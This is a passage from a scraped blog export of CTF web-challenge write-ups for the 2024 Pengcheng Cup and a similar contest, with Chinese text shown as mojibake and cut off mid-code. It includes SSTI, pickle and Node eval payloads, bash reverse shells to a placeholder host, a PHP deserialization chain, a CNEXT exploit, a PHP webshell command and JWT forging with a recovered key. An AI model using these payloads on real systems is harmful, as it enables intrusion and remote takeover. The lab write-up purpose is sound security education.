[{"content":"å­¦å¼Ÿä»¬å¤ªå¼ºäº†\nå£ç®— 1så†…ç®—å¼ï¼Œä½¿ç”¨pythonç®—å°±è¡Œï¼ˆç›´æ¥ä½¿ç”¨evalä¸å®‰å…¨ï¼Œå¤§å®¶ä¸è¦å­¦ï¼‰ï¼Œç„¶åå¯ä»¥å¾—åˆ°hintï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @app.route(\u0026#39;/\u0026#39;) def index(solved=0): global current_expr # å‰ç«¯è®¡ç®— ..... ..... # é€šè¿‡è®¡ç®— username = \u0026#39;ctfer!\u0026#39; if request.args.get(\u0026#39;username\u0026#39;): username = request.args.get(\u0026#39;username\u0026#39;) if whitelist_filter(username,whitelist_patterns): if blacklist_filter(username): return render_template_string(\u0026#34;filtered\u0026#34;) else: print(\u0026#34;ä½ è¿‡å…³ï¼\u0026#34;) else: return render_template_string(\u0026#34;filtered\u0026#34;) return render_template(\u0026#39;index.html\u0026#39;, username=username, hint=\u0026#34;f4dd790b-bc4e-48de-b717-903d433c597f\u0026#34;) å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªsstiç›²æ‰“ï¼Œä¸»è¦æ˜¯ç©ºæ ¼ç­‰è¢«è¿‡æ»¤äº†ï¼Œç”¨åå…­è¿›åˆ¶ç»•è¿‡ï¼Œå› ä¸ºpopené‡Œé¢è¿˜æœ‰ä¸€æ®µpythonä»£ç éœ€è¦æ‰§è¡Œï¼Œå› æ­¤éœ€è¦evalï¼š\nï¼ˆæ˜æ˜hintä¸­æ˜¯getå‚æ•°ï¼Œç»“æœå®é™…ä¸Šæ˜¯postï¼Œæ‡µäº†åŠå¤©ï¼‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import requests session = requests.Session() res = session.get(\u0026#34;http://192.168.18.28/calc\u0026#34;) c = res.text print(c) result = eval(c) print(result) cmd=\u0026#39;cat /flag\u0026#39; cmd=cmd.encode(\u0026#39;utf-8\u0026#39;).hex() data = {\u0026#34;username\u0026#34;:\u0026#34;{{g.pop.__globals__.__builtins__[\u0026#39;eval\u0026#39;](\\\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(bytes.fromhex(\u0026#39;636174202f666c6167\u0026#39;).decode()).read()\\\u0026#34;)}}\u0026#34;} print(data) res = session.post(\u0026#34;http://192.168.18.28/?Submit=%E6%8F%90%E4%BA%A4\u0026amp;answer=\u0026#34;+str(result),data=data) print(res.text) ez_python æ‰«å‡ºä¸€ä¸ªloginè·¯ç”±ï¼Œçˆ†ç ´å¾—åˆ°è´¦å·test:123456ï¼Œè¿”å›ä¸€ä¸ªtokenï¼š\n1 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJ0ZXN0IiwiZXhwIjoxNzMxMTIwMTQ5fQ.OXE4Os6vL6dZ8KyWeH-CUDKmIBSvUIv15luP8VqXF8o ç›´æ¥çˆ†ç ´å¯ä»¥å¾—åˆ°å¯†é’¥a123456ï¼Œä¿®æ”¹jwtä¸ºadminä¹‹åè¿”å›â€œå¬è¯´seræœ‰ç‚¹ä¸œè¥¿â€\nè®¿é—®serè·¯ç”±å¾—åˆ°ä¸€ä¸ªpickleååºåˆ—åŒ–\néšä¾¿æ‰¾ä¸ªpayloadæ‰“å°±è¡Œï¼š\n1 2 3 4 (S\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/xxx/8888 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; ios system . 1 {\u0026#34;pickled\u0026#34;:\u0026#34;KFMnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC94eHgvODg4OCAwPiYxIicNCmlvcw0Kc3lzdGVtDQou\u0026#34;} not admin æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 const express = require(\u0026#39;express\u0026#39;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const jwt = require(\u0026#39;jsonwebtoken\u0026#39;); let { User } = require(\u0026#39;./user\u0026#39;); const crypto = require(\u0026#39;crypto\u0026#39;); const path = require(\u0026#39;path\u0026#39;) const app = express(); const port = 3000; app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); app.set(\u0026#39;views\u0026#39;, path.join(__dirname, \u0026#39;views\u0026#39;)); app.use(express.static(\u0026#39;public\u0026#39;)); app.use(bodyParser.urlencoded({ extended: true })); app.use(express.json()); const tmp_user = {} function authenticateToken(req, res, next) { const authHeader = req.headers[\u0026#39;authorization\u0026#39;]; const token = authHeader; if (tmp_user.secretKey == undefined) { tmp_user.secretKey = crypto.randomBytes(16).toString(\u0026#39;hex\u0026#39;); } if (!token) { return res.redirect(\u0026#39;/login\u0026#39;); } try { const decoded = jwt.verify(token, tmp_user.secretKey); req.user = decoded; next(); } catch (ex) { return res.status(400).send(\u0026#39;Invalid token.\u0026#39;); } } const merge = (a, b) =\u0026gt; { for (var c in b) { console.log(JSON.stringify(b[c])); if (check(b[c])) { if (a.hasOwnProperty(c) \u0026amp;\u0026amp; b.hasOwnProperty(c) \u0026amp;\u0026amp; typeof a[c] === \u0026#39;object\u0026#39; \u0026amp;\u0026amp; typeof b[c] === \u0026#39;object\u0026#39;) { merge(a[c], b[c]); } else { a[c] = b[c]; } } else { return 0 } } return a } console.log(tmp_user.secretKey) var check = function (str) { let input = /const|var|let|return|subprocess|Array|constructor|load|push|mainModule|from|buffer|process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base|\u0026#34;|\u0026#39;|\\\\|\\[|\\+|\\*/ig; if (typeof str === \u0026#39;object\u0026#39; \u0026amp;\u0026amp; str !== null) { for (let key in str) { if (!check(key)) { return false; } if (!check(str[key])) { return false; } } return true; } else { return !input.test(str); } }; app.get(\u0026#39;/login\u0026#39;, (req, res) =\u0026gt; { res.render(\u0026#39;login\u0026#39;) }); app.post(\u0026#39;/login\u0026#39;, (req, res) =\u0026gt; { if (merge(tmp_user, req.body)) { if (tmp_user.secretKey == undefined) { tmp_user.secretKey = crypto.randomBytes(16).toString(\u0026#39;hex\u0026#39;); } if (User.verifyLogin(tmp_user.password)) { const token = jwt.sign({ username: tmp_user.username }, tmp_user.secretKey); res.send(`Login successful! Token: ${token}\\nBut nothing happend~`); } else { res.send(\u0026#39;Login failed!\u0026#39;); } } else { res.send(\u0026#34;Hacker denied!\u0026#34;) } }); app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { authenticateToken(req, res, () =\u0026gt; { backcode = eval(tmp_user.code) res.send(\u0026#34;something happend~\u0026#34;) }); }); app.listen(port, () =\u0026gt; { console.log(`Server running at http://localhost:${port}`); }); æœ¬æ¥ä»¥ä¸ºæ˜¯åŸå‹é“¾æ±¡æŸ“ï¼Œç»“æœä»”ç»†çœ‹äº†ä¸‹mergeçš„æ—¶å€™ç›´æ¥æ”¹å°±è¡Œï¼Œä¸ç”¨åŸå‹é“¾\né¦–å…ˆæ³¨æ„åˆ°authenticateTokenå‡½æ•°åªæ˜¯å•çº¯éªŒè¯secretKeyï¼Œè€ŒsecretKeyæ˜¯æˆ‘ä»¬å¯ä»¥ä¿®æ”¹çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆå‘åŒ…ä¿®æ”¹secretKeyï¼š\n1 username=admin\u0026amp;password=123456\u0026amp;secretKey=1234 ç„¶åç”¨è‡ªå·±çš„keyç”Ÿæˆä¸€ä¸ªjwtï¼š\n1 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImsxdGUifQ.Pzma-LxIRrefIx88I6DLGsUz7Mh1Syc5b5WodL59AlE ç„¶åæ‹¿è¿™ä¸ªjwté€šè¿‡authenticateTokenå‡½æ•°å³å¯:\næ¥ç€æ˜¯ç»•è¿‡checkå‡½æ•°ï¼Œåªéœ€è¦å¯¹å…¶è¿›è¡Œè¦†ç›–å³å¯ï¼š\n1 code=check=(str)=\u0026gt;true; ä½¿ç”¨payloadrequire('child_process').execSync('sleep 3')å¯ä»¥ç¡®å®šå·²ç»rceäº†\næœ€åå› ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œåå¼¹shellï¼š\n1 code=require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/xxx/8888 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;) fileread ç»™æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;?php class cls1{ var $cls; var $arr; function show(){ show_source(__FILE__); } function __wakeup(){ foreach($this-\u0026gt;arr as $k =\u0026gt; $v) echo $this-\u0026gt;cls-\u0026gt;$v; } } class cls2{ var $filename = \u0026#39;hello.php\u0026#39;; var $txt = \u0026#39;\u0026#39;; function __get($key){ var_dump($key); if($key == \u0026#39;fileput\u0026#39;) return $this-\u0026gt;fileput(); else return \u0026#39;\u0026lt;p\u0026gt;\u0026#39;.htmlspecialchars($key).\u0026#39;\u0026lt;/p\u0026gt;\u0026#39;; } function fileput(){ echo \u0026#39;Your file:\u0026#39;.file_get_contents($this-\u0026gt;filename); } } if(!empty($_GET)){ $cls = base64_decode($_GET[\u0026#39;ser\u0026#39;]); $instance = unserialize($cls); }else{ $a = new cls1(); $a-\u0026gt;show(); } ?\u0026gt; é¦–å…ˆæ˜¯ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–ï¼Œé“¾å­ï¼š\n1 cls1-\u0026gt;__wakeup()==\u0026gt;cls2-\u0026gt;__get()==\u0026gt;cls2-\u0026gt;fileput() ååºåˆ—åŒ–è„šæœ¬ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 \u0026lt;?php class cls1{ var $cls; var $arr; function __construct($filename){ $this-\u0026gt;cls = new cls2($filename); $this-\u0026gt;arr = array(\u0026#34;fileput\u0026#34;); } function show(){ show_source(__FILE__); } function __wakeup(){ foreach($this-\u0026gt;arr as $k =\u0026gt; $v) echo $this-\u0026gt;cls-\u0026gt;$v; } } class cls2{ var $filename; var $txt = \u0026#39;\u0026#39;; function __construct($filename){ $this-\u0026gt;filename = $filename; } function __get($key){ var_dump($key); if($key == \u0026#39;fileput\u0026#39;) return $this-\u0026gt;fileput(); else return \u0026#39;\u0026lt;p\u0026gt;\u0026#39;.htmlspecialchars($key).\u0026#39;\u0026lt;/p\u0026gt;\u0026#39;; } function fileput(){ echo \u0026#39;Your file:\u0026#39;.file_get_contents($this-\u0026gt;filename); } } // if(!empty($_GET)){ // $cls = base64_decode($_GET[\u0026#39;ser\u0026#39;]); // $instance = unserialize($cls); // }else{ // $a = new cls1(); // $a-\u0026gt;show(); // } if ($argc === 1){ $filename = $argv[0]; echo base64_encode(serialize(new cls1($filename))); } æ‰“è¿‡å»å‘ç°æ²¡æƒé™ï¼Œä½¿ç”¨cnextï¼Œå‚è€ƒvulhub/php/CVE-2024-2961/README.zh-cn.md at master Â· vulhub/vulhubï¼Œexpæ¥è‡ªï¼šhttps://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.pyï¼Œè¿™é‡Œåªä¿®æ”¹äº†Remoteç±»ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 class Remote: \u0026#34;\u0026#34;\u0026#34;A helper class to send the payload and download files. The logic of the exploit is always the same, but the exploit needs to know how to download files (/proc/self/maps and libc) and how to send the payload. The code here serves as an example that attacks a page that looks like: `php \u0026lt;?php $data = file_get_contents($_POST[\u0026#39;file\u0026#39;]); echo \u0026#34;File contents: $data\u0026#34;; ` Tweak it to fit your target, and start the exploit. \u0026#34;\u0026#34;\u0026#34; def __init__(self, url: str) -\u0026gt; None: self.url = url self.session = Session() def send(self, path: str) -\u0026gt; Response: \u0026#34;\u0026#34;\u0026#34;Sends given `path` to the HTTP server. Returns the response. \u0026#34;\u0026#34;\u0026#34; # return self.session.post(self.url, data={\u0026#34;file\u0026#34;: path}) result = subprocess.run([\u0026#39;php\u0026#39;, \u0026#39;ser.php\u0026#39;, path], capture_output=True, text=True) # print(result) payload = result.stdout return self.session.get(self.url, params={\u0026#34;ser\u0026#34;: payload}) def download(self, path: str) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Returns the contents of a remote file. \u0026#34;\u0026#34;\u0026#34; path = f\u0026#34;php://filter/convert.base64-encode/resource={path}\u0026#34; response = self.send(path) data = response.re.search(b\u0026#34;Your file:(.*)\u0026#34;, flags=re.S).group(1) return base64.decode(data) å‘½ä»¤è¡Œï¼š\n1 python my-cnext.py http://target-ip/ \u0026#34;echo \u0026#39;\u0026lt;?=@eval(\\$_POST[1]);?\u0026gt;\u0026#39; \u0026gt; shell.php\u0026#34; LookUp javaä¸ä¼šï¼ˆåœ¨å­¦äº†åœ¨å­¦äº†:sob:ï¼‰\nezLaravel æ ¹æ®ç‰ˆæœ¬æ‰¾åˆ°CVE-2021-3129ï¼Œå‚è€ƒvulhub/laravel/CVE-2021-3129 at master Â· vulhub/vulhubï¼Œç”¨å·¥å…·ç›´æ¥æ‰“å°±è¡Œ\n1 python CVE-2021-3129.py --chain Laravel/RCE12 --host \u0026#34;http://target-ip/\u0026#34; --force ","date":"2024-11-12T20:17:54+08:00","permalink":"https://k1te.cn/p/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E9%A2%98%E8%A7%A3/","title":"2024é¹åŸæ¯Webé¢˜è§£"},{"content":"web01 å’Œå¹¿ä¸œçœèµ›çš„hackmeå·®ä¸å¤šï¼Œä¸Šå›æ²¡åšå‡ºæ¥ï¼Œè¿™æ¬¡å¯ç®—å‡ºäº†ã€‚\né¦–å…ˆé€šè¿‡çˆ†ç ´æ‹¿åˆ°äº†test:123456è´¦å·ï¼Œå‘ç°tokenæ˜¯jwtï¼Œæ‹¿å»è§£æå‘ç°ç®—æ³•æ˜¯RS256ï¼Œç«‹é©¬è”æƒ³åˆ°ä¹‹å‰åšè¿‡çš„çœèµ›ï¼Œç„¶åè¯•äº†ä»¥ä¸‹æ‹¿åˆ°äº†å¦ä¸€ä¸ªè´¦å·test1:123456ã€‚å‚è€ƒCTFtime.org / DownUnderCTF 2021 (Online) / JWT / Writeupï¼Œç°åœ¨æ‹¿åˆ°ä¸¤ä¸ªjwtï¼š\n1 2 test:\u0026#34;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.Itrnrno7k2sM5JAMDLy8h9o217gOaHcX0HHXOBgX0ht8ZcoSoDGgtXFFl4GSTRwn5dBzy2ATJu0kO0rAckS3K5gJE7I1WpBkq7SGOs6E7mA-qCVCbnf9Xpv7XPTLqdCqtYIpwkBi9Z-YlYhJcLPunMv8r9YPuuS-wlwwnsutxEMK\u0026#34; test1:\t\u0026#34;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QxIn0.DLsur1m0A1k4Y-mfdrS-Ki4HnuZpB94Zw_v3HmVKGYwf3ahc97Vn5ayd-68sgcmEY6RFROfRPgtdwkLRv4fwo3s8b3-XEYR7xUdAT3d4Hv2B8GsyNy2XVKa1HPFPMds6dRJSBbj_1C6JIWzGWXSBmfBZh9mCO_6X5r8JiSiJBnA5\u0026#34; é€šè¿‡å·¥å…·FlorianPicca/JWT-Key-Recovery: A tool that recovers the public key used to sign JWT tokensæ‰¾å…¬é’¥ï¼š\nä¸ºäº†è®©æˆ‘ä»¬èƒ½å¤Ÿæ”»å‡»å¾—åˆ°ç§é’¥ï¼Œqè®¾çš„ç‰¹åˆ«å°ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨-vå‚æ•°ï¼Œå°†å‰”é™¤æ‰çš„qæ‹¿åˆ°ï¼Œä»–å¾—åˆ°çš„nå…¶å®æ˜¯pï¼š\nè¿™é‡Œï¼Œpï¼Œqåˆ†åˆ«æ˜¯178048211115023167930364909714255283398194482357968677957206488846565415419075505677774428744888086350459843429621353851000190331379415272521030152286797906949988739054223339912450533294646710918466589293424234948067986174142175715818714310329773739231080433810054482176654201719101411274444511026532726985071ï¼Œ37\nåˆ©ç”¨è„šæœ¬å¾—åˆ°ç§é’¥ï¼ˆè„šæœ¬æ¥è‡ªqsdzï¼‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 import rsa from pathlib import Path admin_token = \u0026#39;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.Itrnrno7k2sM5JAMDLy8h9o217gOaHcX0HHXOBgX0ht8ZcoSoDGgtXFFl4GSTRwn5dBzy2ATJu0kO0rAckS3K5gJE7I1WpBkq7SGOs6E7mA-qCVCbnf9Xpv7XPTLqdCqtYIpwkBi9Z-YlYhJcLPunMv8r9YPuuS-wlwwnsutxEMK\u0026#39; test_token = \u0026#39;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QxIn0.DLsur1m0A1k4Y-mfdrS-Ki4HnuZpB94Zw_v3HmVKGYwf3ahc97Vn5ayd-68sgcmEY6RFROfRPgtdwkLRv4fwo3s8b3-XEYR7xUdAT3d4Hv2B8GsyNy2XVKa1HPFPMds6dRJSBbj_1C6JIWzGWXSBmfBZh9mCO_6X5r8JiSiJBnA5\u0026#39; n = 6587783811255857213423501659427445485733195847244841084416640087322920370505793710077653863560859194967014206895990092487007042261038365083278115634611522557149583345006263576760669731901928303983263803856696693078515488443260501485292429482201628351549976050972015840536205463606752217154446907981710898447627 p = 178048211115023167930364909714255283398194482357968677957206488846565415419075505677774428744888086350459843429621353851000190331379415272521030152286797906949988739054223339912450533294646710918466589293424234948067986174142175715818714310329773739231080433810054482176654201719101411274444511026532726985071 q = 37 # p, q = q, p e = 65537 phi = (p - 1) * (q - 1) d = pow(e, -1, phi) Path(\u0026#39;public.pem\u0026#39;).write_bytes(rsa.PublicKey(n, e).save_pkcs1()) Path(\u0026#39;private.pem\u0026#39;).write_bytes(rsa.PrivateKey(n, e, d, p, q).save_pkcs1()) åˆ©ç”¨å¾—åˆ°çš„å…¬ç§é’¥ç”Ÿæˆadminçš„jwtï¼š\n1 2 3 4 5 6 import jwt test_jwt = \u0026#34;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.Itrnrno7k2sM5JAMDLy8h9o217gOaHcX0HHXOBgX0ht8ZcoSoDGgtXFFl4GSTRwn5dBzy2ATJu0kO0rAckS3K5gJE7I1WpBkq7SGOs6E7mA-qCVCbnf9Xpv7XPTLqdCqtYIpwkBi9Z-YlYhJcLPunMv8r9YPuuS-wlwwnsutxEMK\u0026#34; private_key = b\u0026#34;-----BEGIN RSA PRIVATE KEY-----\\nMIICoQIBAAKBgSSlUMfCzg/ysG4ixoi6NKGuWNnvIpZZTRNa045eH2xzzY/ZyRwD\\nojStMH5wxG6nOVvNAY/ETx2XPPC6J1J//nzC1fANMNCYRa47xIW0RwZBDSABcGnw\\nu3QP2nr7AR0/tZmSClncdwA7RKzlJM8Fs7Zmb502ZMSv0AxMgN5UMh9FCwIDAQAB\\nAoGBC5/r+nCv2+uWXTjL8i6UJtLIfdOssxKbJNiIKLXQh3l8IAAfx1i9ktxYEICW\\nTcGTUkx9gjd+xUwo0KOKjcg3hZc7bEfLkiOsK8dSwsPFEXYQpCE1EFokhkc9Rbiq\\nURC9QIrQjtzf5vdU2usj5ddRGtqtmpXm/ibU1TLPIsy8Y5TJAoGBAP2Mj8b+pnwu\\nSCp0EYh99ogr6jblQlVwySv34UDQarcFjkQoB60SOMZpGCyPr/auhfDIsNvKyXLK\\nS7IBEBFMETWywUx28OGFV7xtGF7RfLWmaKYXy4ML/DfHonV8khZ6h5wpyxPL3Wli\\nuJCSSsjNgXhj4aeGLtRRuySpiXflrdFvAgElAoGBALrhzOO+tJWZQ2XPMVEqjvjl\\nbXfS2WbCf/Theuzb8Zw/AxJncuj1IlXUBpZpvigTkPPd6MXIHV13j/1+3QnyyEiN\\nHf6vOHLxZq6itrDEtafqJP4vUbigr+GpSqxQChl5bNUE1QMdY3AW7LTarzZ8iq5i\\n6GMi+wdRyp+GOqXd65UPAgERAoGAUjts5pfHSt6T8hfOVcf87eS6qgUqRTlWAGwR\\ntCfrQkb9tT1qRfgSadzlPuJ+QirDqAm80amNcVZdvTDG8NpmckfP/R+oEcphpOUc\\nqSFY4PezPMlyb7DcLcQ0sHttpmztthtkdR+GFFdedBPFOjTQC16qDNGSpbmkepfZ\\njqta99E=\\n-----END RSA PRIVATE KEY-----\u0026#34; public_key = b\u0026#34;-----BEGIN RSA PUBLIC KEY-----\\nMIGJAoGBJKVQx8LOD/KwbiLGiLo0oa5Y2e8illlNE1rTjl4fbHPNj9nJHAOiNK0w\\nfnDEbqc5W80Bj8RPHZc88LonUn/+fMLV8A0w0JhFrjvEhbRHBkENIAFwafC7dA/a\\nevsBHT+1mZIKWdx3ADtErOUkzwWztmZvnTZkxK/QDEyA3lQyH0ULAgMBAAE=\\n-----END RSA PUBLIC KEY-----\u0026#34; encoded = jwt.encode({\u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;}, private_key, algorithm=\u0026#34;RS256\u0026#34;) print(encoded) å¾—åˆ°jwt tokenï¼šeyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.DNqIFNdFOWgGGnuk95SQa5GdU_D6TDv95lTU97wUP8ekgqX6zrnvvsnp8XkvVfSx0g3xVQqbo5xhdxjNpM8LiiwX_kQ8FO8t0q0qBn1RJ5O2bGkGOZsUWAUrKg7ME6L4-XFiXi7P328f1t4En_kSp91SeS7-9Lcn7Ja__IJbRuH1\nç™»å½•ä¹‹åé¦–å…ˆçœ‹gameï¼Œå‘ç°éå¸¸æŠ½è±¡ï¼Œé€šè¿‡fuzzçŸ¥é“emojiå¯¹åº”ä¸åŒçš„å­—ç¬¦ï¼Œä¼šå°†å…¶ä½œä¸ºå‘½ä»¤æ‰§è¡Œï¼Œæ„é€ ğŸ’¿ ğŸš©ğŸ˜œğŸ˜ğŸ± â­ï¼Œå³CD flag;P:|cat *çš„åˆ°æºç :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 from flask import Flask, render_template, redirect, url_for, flash, session, request, jsonify, make_response from flask_wtf import FlaskForm from wtforms import StringField, PasswordField, SubmitField, FileField, TextAreaField from wtforms.validators import DataRequired, Length from werkzeug.utils import secure_filename import os import string from authlib.jose import jwt, JoseError import requests app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = \u0026#39;36f8efbea152e50b23290e0ed707b4b0\u0026#39; with open(\u0026#39;/app/flag/private_key.pem\u0026#39;, \u0026#39;r\u0026#39;) as f: private_key = f.read() with open(\u0026#39;/app/flag/public_key.pem\u0026#39;, \u0026#39;r\u0026#39;) as f: public_key = f.read() def game_play(user_input): emoji_table = { \u0026#34;ğŸ˜€\u0026#34;: \u0026#34;:D\u0026#34;, \u0026#34;ğŸ˜‰\u0026#34;: \u0026#34;;)\u0026#34;, \u0026#34;ğŸ˜Š\u0026#34;: \u0026#34;:)\u0026#34;, \u0026#34;ğŸ˜‹\u0026#34;: \u0026#34;:P\u0026#34;, \u0026#34;ğŸ˜\u0026#34;: \u0026#34;B)\u0026#34;, \u0026#34;ğŸ¤”\u0026#34;: \u0026#34;:?\u0026#34;, \u0026#34;ğŸ˜\u0026#34;: \u0026#34;:|\u0026#34;, \u0026#34;ğŸ˜¥\u0026#34;: \u0026#34;:\u0026#39;(\u0026#34;, \u0026#34;ğŸ˜®\u0026#34;: \u0026#34;:o\u0026#34;, \u0026#34;ğŸ¤\u0026#34;: \u0026#34;:x\u0026#34;, \u0026#34;ğŸ˜¯\u0026#34;: \u0026#34;:o\u0026#34;, \u0026#34;ğŸ˜ª\u0026#34;: \u0026#34;:\u0026#39;(\u0026#34;, \u0026#34;ğŸ˜«\u0026#34;: \u0026#34;\u0026gt;:(\u0026#34;, \u0026#34;ğŸ˜´\u0026#34;: \u0026#34;Zzz\u0026#34;, \u0026#34;ğŸ˜œ\u0026#34;: \u0026#34;;P\u0026#34;, \u0026#34;ğŸ˜\u0026#34;: \u0026#34;XP\u0026#34;, \u0026#34;ğŸ˜’\u0026#34;: \u0026#34;:/\u0026#34;, \u0026#34;ğŸ™ƒ\u0026#34;: \u0026#34;(:\u0026#34;, \u0026#34;ğŸ˜²\u0026#34;: \u0026#34;:O\u0026#34;, \u0026#34;â˜¹ï¸\u0026#34;: \u0026#34;:(\u0026#34;, \u0026#34;ğŸ™\u0026#34;: \u0026#34;:(\u0026#34;, \u0026#34;ğŸ˜–\u0026#34;: \u0026#34;\u0026gt;:(\u0026#34;, \u0026#34;ğŸ˜\u0026#34;: \u0026#34;:(\u0026#34;, \u0026#34;ğŸ˜¤\u0026#34;: \u0026#34;\u0026gt;:(\u0026#34;, \u0026#34;ğŸ˜¢\u0026#34;: \u0026#34;:\u0026#39;(\u0026#34;, \u0026#34;ğŸ˜¦\u0026#34;: \u0026#34;:(\u0026#34;, \u0026#34;ğŸ˜°\u0026#34;: \u0026#34;:(\u0026#34;, \u0026#34;ğŸ˜±\u0026#34;: \u0026#34;:O\u0026#34;, \u0026#34;ğŸ¤ª\u0026#34;: \u0026#34;:P\u0026#34;, \u0026#34;ğŸ˜µ\u0026#34;: \u0026#34;X(\u0026#34;, \u0026#34;ğŸ¥´\u0026#34;: \u0026#34;:P\u0026#34;, \u0026#34;ğŸ˜ \u0026#34;: \u0026#34;\u0026gt;:(\u0026#34;, \u0026#34;ğŸ˜¡\u0026#34;: \u0026#34;\u0026gt;:(\u0026#34;, \u0026#34;ğŸ¤•\u0026#34;: \u0026#34;:(\u0026#34;, \u0026#34;ğŸ¤¢\u0026#34;: \u0026#34;X(\u0026#34;, \u0026#34;ğŸ¤®\u0026#34;: \u0026#34;:P\u0026#34;, \u0026#34;ğŸ¤§\u0026#34;: \u0026#34;:\u0026#39;(\u0026#34;, \u0026#34;ğŸ˜‡\u0026#34;: \u0026#34;O:)\u0026#34;, \u0026#34;ğŸ¥³\u0026#34;: \u0026#34;:D\u0026#34;, \u0026#34;ğŸ¥º\u0026#34;: \u0026#34;:\u0026#39;(\u0026#34;, \u0026#34;ğŸ¤¡\u0026#34;: \u0026#34;:o)\u0026#34;, \u0026#34;ğŸ¤ \u0026#34;: \u0026#34;Y)\u0026#34;, \u0026#34;ğŸ¤¥\u0026#34;: \u0026#34;:L\u0026#34;, \u0026#34;ğŸ¶\u0026#34;: \u0026#34;dog\u0026#34;, \u0026#34;ğŸ±\u0026#34;: \u0026#34;cat\u0026#34;, \u0026#34;ğŸ­\u0026#34;: \u0026#34;mouse\u0026#34;, \u0026#34;ğŸ°\u0026#34;: \u0026#34;rabbit\u0026#34;, \u0026#34;ğŸ¦Š\u0026#34;: \u0026#34;fox\u0026#34;, \u0026#34;ğŸ·\u0026#34;: \u0026#34;pig\u0026#34;, \u0026#34;ğŸ½\u0026#34;: \u0026#34;pig nose\u0026#34;, \u0026#34;ğŸ¸\u0026#34;: \u0026#34;frog\u0026#34;, \u0026#34;ğŸ’\u0026#34;: \u0026#34;monkey\u0026#34;, \u0026#34;ğŸ”\u0026#34;: \u0026#34;chicken\u0026#34;, \u0026#34;ğŸ§\u0026#34;: \u0026#34;penguin\u0026#34;, \u0026#34;ğŸ¦\u0026#34;: \u0026#34;bird\u0026#34;, \u0026#34;ğŸš—\u0026#34;: \u0026#34;car\u0026#34;, \u0026#34;ğŸš•\u0026#34;: \u0026#34;taxi\u0026#34;, \u0026#34;ğŸš\u0026#34;: \u0026#34;helicopter\u0026#34;, \u0026#34;ğŸ›¶\u0026#34;: \u0026#34;canoe\u0026#34;, \u0026#34;â›µ\u0026#34;: \u0026#34;sailboat\u0026#34;, \u0026#34;ğŸš¤\u0026#34;: 